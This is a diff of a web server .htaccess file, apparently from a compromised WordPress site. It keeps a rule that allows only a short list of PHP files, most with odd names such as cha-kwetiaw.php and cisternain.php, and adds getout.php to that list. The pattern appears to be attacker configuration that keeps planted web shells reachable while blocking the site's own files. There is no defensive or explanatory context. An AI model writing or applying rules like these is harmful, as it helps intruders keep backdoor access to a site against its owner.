@@ -3,7 +3,7 @@ Options -Indexes
 Order Allow,Deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|wp-load-script.php|cha-kwetiaw.php|reboot.php|Ipv4.php|cisternain.php|class-wp-engine.php|wp-blog.php|class-wp-application-passwords-list-options.php|cache.php)$">
+<FilesMatch "^(index.php|getout.php|wp-load-script.php|cha-kwetiaw.php|reboot.php|Ipv4.php|cisternain.php|class-wp-engine.php|wp-blog.php|class-wp-application-passwords-list-options.php|cache.php)$">
 Order Allow,Deny
 Allow from all
 </FilesMatch>
